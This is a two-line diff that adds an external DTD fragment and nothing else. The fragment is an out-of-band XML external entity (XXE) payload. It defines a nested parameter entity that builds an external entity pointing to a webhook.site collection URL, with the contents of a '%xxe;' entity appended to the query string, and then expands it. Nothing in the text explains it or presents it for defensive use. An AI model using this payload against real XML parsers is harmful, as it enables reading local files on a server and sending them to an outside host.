@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://webhook.site/9a002e1a-0362-4de6-a93b-0fe09a993c8c/?%xxe;'>">
+%all;
